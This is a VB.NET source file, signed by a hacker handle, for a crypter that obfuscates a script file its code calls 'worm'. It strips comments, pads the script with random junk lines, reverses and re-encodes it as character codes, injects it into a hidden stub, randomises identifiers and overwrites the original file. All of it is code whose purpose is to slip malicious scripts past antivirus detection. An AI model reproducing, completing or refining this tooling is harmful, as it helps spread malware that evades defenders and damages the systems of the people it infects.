﻿Module Module1

'' All Coded By MrZer0 - Chappie
'' Thenx To : AFHJQ - Dot Group - Terr0r1st_Dz - SCREAM - Mr-SALAH - SAUD - AWS <3 - Slto7 - HOUDINI

    Public Function TouprDo(ByVal s As String) As String
        Dim strArray As String() = Strings.Split(s, """", -1, CompareMethod.Binary)
        Dim str As String = ""
        Dim num2 As Integer = (strArray.Length - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            If ((i Mod 2) = 0) Then
                str = (str & strArray(i))
            ElseIf (strArray(i) = "") Then
                str = (str & """""")
            Else
                str = (str & ToChrW(strArray(i)))
            End If
            i += 1
        Loop
        Return str
    End Function

    Function form(ByVal n)
        Dim ret = ""
        Dim r = Int(Rnd() * 28)
        Dim k = Int(Rnd() * 2)
        If (k = 0) Then ret = (r + n) & "-" & r
        If (k = 1) Then ret = (n - r) & "+" & r
        If (k = 2) Then ret = (n * r) & "/" & r
        Return ret
    End Function
    Public Function ToChrW(ByVal [Text] As String) As String
        Dim str2 As String = ""
        Dim length As Integer = [Text].Length
        Dim i As Integer = 1
        Do While (i <= length)
            Dim str As String = Strings.Mid([Text], i, 1)
            If (i = [Text].Length) Then
                str2 = (str2 & "a12(" & (Convert.ToString(Strings.Asc(str))) & ")")
            Else
                str2 = (str2 & "a12(" & (Convert.ToString(Strings.Asc(str))) & ") & ")
            End If
            i += 1
        Loop
        Return str2
    End Function


    Public Function TouprDo1(ByVal s As String, ByVal T As Boolean) As String
        Dim strArray As String() = Strings.Split(s, """", -1, CompareMethod.Binary)
        Dim str As String = ""
        Dim num2 As Integer = (strArray.Length - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            If ((i Mod 2) = 0) Then
                If T Then
                    str = (str & strArray(i).ToUpper)
                Else
                    str = (str & strArray(i).ToLower)
                End If
            Else
                str = (str & """" & strArray(i) & """")
            End If
            i += 1
        Loop
        Return str
    End Function
    Sub main()
        Dim Path, All() As String
        All = Nothing
        For Each Arg As String In System.Environment.GetCommandLineArgs
            All = Arg.Split("|")
        Next
        Path = All(0)
        Dim stub As String = My.Resources.String1
        Dim worm As String = (IO.File.ReadAllText(Path))

        Dim a As Integer = 0
        Dim new_str As String = Nothing
        Dim Temp_str = Nothing
        Dim TextLines() As String = worm.Split(Environment.NewLine.ToCharArray, System.StringSplitOptions.RemoveEmptyEntries)
        For Each aa In TextLines
            If Mid(aa, 1, 1) = "'" Then
                aa = aa.Replace(aa, "")
            End If
            a += 1
            new_str &= aa & vbNewLine
        Next
        worm = "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & "'" & Gen(True, True, True, True, 40) & vbNewLine & new_str
        worm = StrReverse(TouprDo1(worm, False))
        Dim RRa As String = Gen(True, True, True, False, 10)
        Dim bbaa As String = (ToChrW(worm, ""))
        Dim aaa As String = Zer0_Encrypt(bbaa)
        Dim aaaa As String = Split_String(aaa, Gen(False, False, True, False, 4))
        Dim aaaaa As String = aaaa & vbCrLf & "'" & RRa
        stub = stub.Replace("%RR%", RRa)
        stub = stub.Replace("%b%", aaaaa)
        stub = stub.Replace("%StartUp%", "False")
        Dim rrr As String = "troihjoertijhoietjhoij"
        Dim r As Integer = 0
        Dim rr As String = TouprDo(stub)
        For i = 1 To 100
            Dim rrrr As String = Gen(False, True, False, False, 1) & Gen(True, True, True, False, 10 + i)
            rr = rr.Replace("a" & i, rrrr)
        Next
        For i = 1 To 100
            rr = rr.Replace("b" & i, Gen(False, True, False, False, 1) & Gen(True, True, True, False, 100))
        Next
        ' rr = rr.Replace("A12", rrr)
        IO.File.Delete(Path)
        IO.File.WriteAllText((Path), TouprDo1(rr, True))
        End
    End Sub
    Function ToChrW(ByVal Text As String, ByVal spl As String) As String
        Dim Chr As String
        Dim strAscii = ""
        For I = 1 To Text.Length
            Chr = Mid(Text, I, 1)
            strAscii = strAscii & Asc(Chr) & spl
        Next
        Return strAscii
    End Function
    Public Function Zer0_Encrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("1", "").Replace("2", "").Replace("3", "").Replace("4", "").Replace("5", "").Replace("6", "").Replace("7", "").Replace("8", "").Replace("9", "")
        Return ParmEnc
    End Function
    Public Function Gen(ByVal Small As Boolean, ByVal Capetal As Boolean, ByVal Number As Boolean, ByVal Other As Boolean, ByVal Length As Integer)
        Dim s As String = ""
        Dim en As String = ""
        If Small = True Then
            s &= "abcdefghijklmnopqrstuvwxyz"
        End If
        If Capetal = True Then
            s &= "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        End If
        If Number = True Then
            s &= "0123456789"
        End If
        If Other = True Then
            s &= "!@#$%^&*()_+-=\/|[]{}:;<>"
        End If
        Dim Generator As System.Random = New System.Random()
        For i = 1 To Length
            en &= Mid(s, Int(Rnd() * Generator.Next(1, s.Length) + 1), 1)
        Next i
        Return en
    End Function
    Public Function Split_String(ByVal s As String, ByVal p As Integer) As String  '' Split String 

        Dim en As String = ""
        For i = 1 To s.Length Step p
            en &= "'" & StrReverse(Mid(s, i, p)) & vbNewLine
        Next
        Return en
    End Function
End Module
